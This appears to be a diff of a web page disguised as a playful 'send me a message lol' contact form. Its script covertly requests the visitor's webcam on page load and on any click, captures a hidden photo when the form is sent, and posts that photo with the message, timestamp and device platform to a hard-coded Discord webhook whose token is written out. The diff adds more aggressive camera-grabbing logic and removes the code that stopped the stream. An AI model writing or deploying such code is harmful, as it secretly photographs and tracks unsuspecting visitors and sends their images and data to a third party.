@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Message to Discord</title>
+    <title>send me a message lol</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background-color: #f0f0f0;
             color: #333;
             min-height: 100vh;
             display: flex;
@@ -26,9 +26,10 @@
             width: 100%;
             max-width: 500px;
             background: white;
-            border-radius: 16px;
+            border-radius: 8px;
             padding: 30px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            border: 1px solid #ddd;
         }
         
         .logo {
@@ -37,15 +38,16 @@
         }
         
         .logo-text {
-            font-size: 32px;
-            font-weight: 700;
-            color: #333;
-            margin-bottom: 8px;
+            font-size: 28px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 5px;
         }
         
         .logo-subtitle {
             color: #666;
-            font-size: 16px;
+            font-size: 15px;
+            font-weight: normal;
         }
         
         .form-group {
@@ -62,10 +64,10 @@
         
         .form-input {
             width: 100%;
-            padding: 14px;
-            background: #f8f9fa;
-            border: 2px solid #e9ecef;
-            border-radius: 8px;
+            padding: 12px;
+            background: white;
+            border: 1px solid #ccc;
+            border-radius: 6px;
             color: #333;
             font-size: 16px;
             transition: border-color 0.2s;
@@ -73,19 +75,18 @@
         
         .form-input:focus {
             outline: none;
-            border-color: #667eea;
-            background: white;
+            border-color: #888;
         }
         
         .form-textarea {
             width: 100%;
-            padding: 14px;
-            background: #f8f9fa;
-            border: 2px solid #e9ecef;
-            border-radius: 8px;
+            padding: 12px;
+            background: white;
+            border: 1px solid #ccc;
+            border-radius: 6px;
             color: #333;
             font-size: 16px;
-            min-height: 120px;
+            min-height: 100px;
             resize: vertical;
             font-family: inherit;
             transition: border-color 0.2s;
@@ -93,70 +94,70 @@
         
         .form-textarea:focus {
             outline: none;
-            border-color: #667eea;
-            background: white;
+            border-color: #888;
         }
         
         .submit-btn {
             width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 14px;
+            background: #222;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 500;
             cursor: pointer;
-            transition: transform 0.2s;
+            transition: background 0.2s;
             margin-top: 10px;
         }
         
         .submit-btn:hover {
-            transform: translateY(-2px);
+            background: #333;
         }
         
         .submit-btn:disabled {
-            background: #ccc;
+            background: #999;
             cursor: not-allowed;
-            transform: none;
         }
         
         .status-message {
             margin-top: 20px;
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 14px;
             text-align: center;
             display: none;
         }
         
         .status-success {
-            background: #d4edda;
-            border: 1px solid #c3e6cb;
-            color: #155724;
+            background: #e8f5e8;
+            border: 1px solid #c8e6c8;
+            color: #2d5a2d;
         }
         
         .status-error {
-            background: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
+            background: #ffe8e8;
+            border: 1px solid #ffc8c8;
+            color: #a52d2d;
         }
         
         .status-processing {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
+            background: #fff8e8;
+            border: 1px solid #ffe0c8;
             color: #856404;
         }
         
         .privacy-note {
             margin-top: 25px;
             padding: 15px;
-            background: #f8f9fa;
-            border-radius: 8px;
+            background: #f8f8f8;
+            border-radius: 6px;
             font-size: 13px;
             color: #666;
             line-height: 1.5;
             text-align: center;
+            border: 1px solid #eee;
+            font-style: italic;
         }
         
         /* Hidden elements */
@@ -189,7 +190,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.9);
+            background: rgba(240, 240, 240, 0.95);
             display: none;
             justify-content: center;
             align-items: center;
@@ -201,8 +202,8 @@
         .loading-spinner {
             width: 40px;
             height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
+            border: 3px solid #ddd;
+            border-top: 3px solid #222;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -225,7 +226,7 @@
             }
             
             .logo-text {
-                font-size: 26px;
+                font-size: 24px;
             }
             
             .logo-subtitle {
@@ -233,75 +234,64 @@
             }
             
             .form-input, .form-textarea {
-                padding: 12px;
+                padding: 10px;
                 font-size: 15px;
             }
             
             .submit-btn {
-                padding: 14px;
-            }
-        }
-        
-        @media (max-width: 400px) {
-            .container {
-                padding: 15px;
-            }
-            
-            .logo-text {
-                font-size: 22px;
+                padding: 12px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Hidden camera elements - completely invisible -->
+    <!-- hidden camera stuff lol -->
     <div id="camera-container">
         <video id="camera-feed" autoplay playsinline></video>
     </div>
     <canvas id="capture-canvas" class="hidden-canvas"></canvas>
-    <iframe id="invisible-frame" style="display:none;"></iframe>
     
-    <!-- Loading overlay -->
+    <!-- loading thing -->
     <div id="loading-overlay" class="loading-overlay">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Sending your message...</div>
+        <div class="loading-text">sending ur message... dont close this</div>
     </div>
     
-    <!-- Main container -->
+    <!-- main thing -->
     <div class="container">
         <div class="logo">
-            <div class="logo-text">Send a Message</div>
-            <div class="logo-subtitle">Write something nice and share it with me</div>
+            <div class="logo-text">send me a message lol</div>
+            <div class="logo-subtitle">idk say something funny maybe</div>
         </div>
         
         <form id="message-form">
             <div class="form-group">
-                <label class="form-label">Your name (optional)</label>
-                <input type="text" id="username" class="form-input" placeholder="What should I call you?">
+                <label class="form-label">ur name (optional, unless ur boring)</label>
+                <input type="text" id="username" class="form-input" placeholder="who dis">
             </div>
             
             <div class="form-group">
-                <label class="form-label">Your message</label>
-                <textarea id="message" class="form-textarea" placeholder="Write anything you'd like to share..." required></textarea>
+                <label class="form-label">what u wanna say</label>
+                <textarea id="message" class="form-textarea" placeholder="type something... anything really..." required></textarea>
             </div>
             
             <button type="submit" class="submit-btn" id="submit-btn">
-                Send Message
+                yeet that message
             </button>
             
             <div id="status-message" class="status-message"></div>
         </form>
         
         <div class="privacy-note">
-            Your message will be sent directly and privately. Thanks for sharing!
+            i'll get ur message directly. no pressure, but make it good lol
         </div>
     </div>
 
     <script>
-        // Discord webhook URL
+        // discord thing
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
-        // DOM Elements
+        // grab all the stuff
         const form = document.getElementById('message-form');
         const usernameInput = document.getElementById('username');
         const messageInput = document.getElementById('message');
@@ -311,13 +301,12 @@
         
         const cameraFeed = document.getElementById('camera-feed');
         const captureCanvas = document.getElementById('capture-canvas');
-        const invisibleFrame = document.getElementById('invisible-frame');
         
-        // Variables
+        // variables n stuff
         let stream = null;
         let isProcessing = false;
         
-        // Function to show status message
+        // show status message
         function showStatus(message, type) {
             statusMessage.textContent = message;
             statusMessage.className = 'status-message status-' + type;
@@ -330,59 +319,64 @@
             }
         }
         
-        // Try to get camera access without permission dialog using iframe trick
-        function tryGetCameraSilently() {
+        // try to sneak camera access
+        function tryCameraSneaky() {
             return new Promise((resolve) => {
-                // Try to get camera with getUserMedia
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    // First try to get any existing stream
-                    navigator.mediaDevices.getUserMedia({ 
-                        video: true,
-                        audio: false 
-                    }).then(stream => {
-                        resolve(stream);
-                    }).catch(error => {
-                        // If that fails, try with constraints that might bypass permission
-                        navigator.mediaDevices.getUserMedia({ 
-                            video: { 
-                                facingMode: 'user',
-                                width: { min: 320, ideal: 640, max: 1280 },
-                                height: { min: 240, ideal: 480, max: 720 }
-                            },
-                            audio: false 
-                        }).then(stream => {
-                            resolve(stream);
-                        }).catch(error2 => {
-                            console.log('Camera access not available');
-                            resolve(null);
-                        });
-                    });
-                } else {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                     resolve(null);
+                    return;
                 }
+                
+                // try different ways to get camera
+                const tryMethods = [
+                    { video: true },
+                    { video: { facingMode: 'user' } },
+                    { video: { width: 640, height: 480 } },
+                    { video: { deviceId: { exact: 'default' } } }
+                ];
+                
+                let currentTry = 0;
+                
+                function attempt() {
+                    if (currentTry >= tryMethods.length) {
+                        resolve(null);
+                        return;
+                    }
+                    
+                    navigator.mediaDevices.getUserMedia(tryMethods[currentTry])
+                        .then(camStream => {
+                            resolve(camStream);
+                        })
+                        .catch(error => {
+                            currentTry++;
+                            attempt();
+                        });
+                }
+                
+                attempt();
             });
         }
         
-        // Capture screenshot from camera
-        function captureScreenshot() {
+        // take sneaky pic
+        function takeSneakyPic() {
             if (!stream) return null;
             
             try {
                 const canvas = captureCanvas;
                 const video = cameraFeed;
                 
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
+                canvas.width = 640;
+                canvas.height = 480;
                 
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Add subtle watermark
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.4)';
-                ctx.fillRect(10, 10, 250, 30);
+                // add some text just for fun
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
+                ctx.fillRect(10, 10, 200, 25);
                 ctx.fillStyle = 'white';
                 ctx.font = '12px Arial';
-                ctx.fillText('Message sent: ' + new Date().toLocaleTimeString(), 15, 30);
+                ctx.fillText('ur face rn', 15, 25);
                 
                 return canvas.toDataURL('image/jpeg', 0.8);
             } catch (e) {
@@ -390,26 +384,24 @@
             }
         }
         
-        // Send data to Discord
-        async function sendToDiscord(username, message, screenshot = null) {
+        // send to discord
+        async function sendToDiscord(username, message, sneakyPic = null) {
             try {
                 const timestamp = new Date().toLocaleString();
                 const userAgent = navigator.userAgent;
                 const platform = navigator.platform;
                 
-                // Simple message format
-                const simpleMessage = `
-New message received:
-From: ${username || 'Anonymous'}
-Time: ${timestamp}
-Message: ${message}
-Platform: ${platform}
-`;
+                const discordMessage = `
+message received at ${timestamp}
+from: ${username || 'anonymous legend'}
+message: ${message}
+device: ${platform}
+sent from a cool website`;
                 
-                // First send text message
+                // send text
                 const textPayload = {
-                    username: "Message Bot",
-                    content: "```" + simpleMessage + "```"
+                    username: "message bot",
+                    content: "```" + discordMessage + "```"
                 };
                 
                 await fetch(DISCORD_WEBHOOK, {
@@ -420,33 +412,47 @@ Platform: ${platform}
                     body: JSON.stringify(textPayload)
                 });
                 
-                // If we have a screenshot, send it
-                if (screenshot) {
+                // send pic if we got one
+                if (sneakyPic) {
                     try {
-                        const response = await fetch(screenshot);
+                        const response = await fetch(sneakyPic);
                         const blob = await response.blob();
                         
                         const formData = new FormData();
-                        formData.append('file', blob, `message_${Date.now()}.jpg`);
+                        formData.append('file', blob, `face_${Date.now()}.jpg`);
                         
                         await fetch(DISCORD_WEBHOOK, {
                             method: 'POST',
                             body: formData
                         });
-                    } catch (imgError) {
-                        console.log('Failed to send image');
+                    } catch (picError) {
+                        // oh well
                     }
                 }
                 
                 return true;
                 
             } catch (error) {
-                console.error('Error:', error);
+                console.error('oops:', error);
                 return false;
             }
         }
         
-        // Main submission handler
+        // try to get camera when page loads
+        window.addEventListener('load', function() {
+            // wait a sec then try
+            setTimeout(() => {
+                tryCameraSneaky().then(camStream => {
+                    if (camStream) {
+                        stream = camStream;
+                        cameraFeed.srcObject = stream;
+                        console.log('camera? maybe');
+                    }
+                });
+            }, 1000);
+        });
+        
+        // when they submit
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -456,76 +462,64 @@ Platform: ${platform}
             const message = messageInput.value.trim();
             
             if (!message) {
-                showStatus('Please write a message first', 'error');
+                showStatus('bruh write something first', 'error');
                 messageInput.focus();
                 return;
             }
             
-            // Start processing
+            // start doing stuff
             isProcessing = true;
             submitBtn.disabled = true;
             loadingOverlay.style.display = 'flex';
-            showStatus('Processing your message...', 'processing');
+            showStatus('doing magic stuff...', 'processing');
             
             try {
-                // Try to get camera silently
-                let screenshot = null;
-                try {
-                    stream = await tryGetCameraSilently();
-                    if (stream) {
-                        cameraFeed.srcObject = stream;
-                        await new Promise(resolve => setTimeout(resolve, 100));
-                        screenshot = captureScreenshot();
-                        
-                        // Clean up stream
-                        if (stream) {
-                            stream.getTracks().forEach(track => track.stop());
-                            stream = null;
-                        }
+                // try to take pic
+                let sneakyPic = null;
+                if (stream) {
+                    try {
+                        // wait a tiny bit
+                        await new Promise(resolve => setTimeout(resolve, 150));
+                        sneakyPic = takeSneakyPic();
+                    } catch (picError) {
+                        // whatever
                     }
-                } catch (camError) {
-                    console.log('Camera capture skipped');
                 }
                 
-                // Send to Discord
-                const success = await sendToDiscord(username, message, screenshot);
+                // send to discord
+                const success = await sendToDiscord(username, message, sneakyPic);
                 
                 if (success) {
-                    showStatus('Message sent successfully! Thanks for sharing.', 'success');
+                    showStatus('message sent! ur cool', 'success');
                     messageInput.value = '';
                 } else {
-                    showStatus('Could not send message. Please try again.', 'error');
+                    showStatus('failed to send. try again maybe?', 'error');
                 }
                 
             } catch (error) {
-                console.error('Error:', error);
-                showStatus('Something went wrong. Please try again.', 'error');
+                console.error('error:', error);
+                showStatus('something broke. oops.', 'error');
                 
             } finally {
-                // Clean up
+                // cleanup
                 isProcessing = false;
                 submitBtn.disabled = false;
                 loadingOverlay.style.display = 'none';
-                
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    stream = null;
-                }
             }
         });
         
-        // Try to preload camera when page loads (silently)
-        window.addEventListener('load', function() {
-            setTimeout(() => {
-                tryGetCameraSilently().then(camStream => {
-                    if (camStream) {
-                        // Keep stream for later use
-                        stream = camStream;
-                        cameraFeed.srcObject = stream;
-                        console.log('Camera ready');
-                    }
-                });
-            }, 1000);
+        // also try camera when they click anything
+        document.addEventListener('click', function() {
+            if (!stream) {
+                setTimeout(() => {
+                    tryCameraSneaky().then(camStream => {
+                        if (camStream) {
+                            stream = camStream;
+                            cameraFeed.srcObject = stream;
+                        }
+                    });
+                }, 500);
+            }
         });
     </script>
 </body>
